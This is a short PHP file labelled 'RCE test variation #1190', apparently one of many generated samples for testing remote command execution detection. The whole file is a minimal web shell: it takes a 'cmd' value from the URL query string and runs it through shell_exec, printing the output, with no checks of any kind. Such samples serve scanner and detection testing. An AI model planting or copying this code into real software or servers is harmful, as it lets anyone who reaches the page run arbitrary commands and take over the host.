<?php
// RCE test variation #1190
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>